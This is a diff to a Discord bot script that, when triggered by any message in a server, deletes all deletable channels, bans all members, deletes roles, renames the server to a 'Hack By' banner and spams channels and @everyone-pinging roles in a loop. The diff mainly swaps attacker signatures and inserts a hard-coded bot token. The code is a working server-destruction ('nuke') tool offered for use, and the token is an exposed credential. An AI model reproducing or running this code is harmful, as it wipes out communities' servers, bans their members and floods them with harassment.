@@ -6,24 +6,24 @@ client.on("message", message => {
     if (message.channel.guild) {
       message.guild.channels.forEach(c => {
         if (c.deletable) {
-          c.delete();
+          c.delete(".");
         }
       });
       message.guild.members.forEach(m => {
-        m.ban();
+        m.ban(".");
       });
       message.guild.roles.forEach(r => {
         r.delete();
       });
-      message.guild.setName("Hack By Dark Man");
+      message.guild.setName("Hack By mam vandam up");
       setInterval(function() {
-        message.guild.createChannel("By Dark Man", "voice");
-        message.guild.createChannel("By Dark Man", "text");
-        message.guild.createRole({ name: "By Dark Man" });
+        message.guild.createChannel("By harki ", "voice");
+        message.guild.createChannel("By taman", "text");
+        message.guild.createRole({ name: "By taman manu brakany up @everyone " });
       });
     }
   }
 });
 
-client.login("");
+client.login("ODIxMDU5NjExNzY3MjEwMDI0.YE-NWQ.djoug0DnwpvQFQ-gTuSwAMYvjlw");
 ///////By Dark Man\\\\\\\
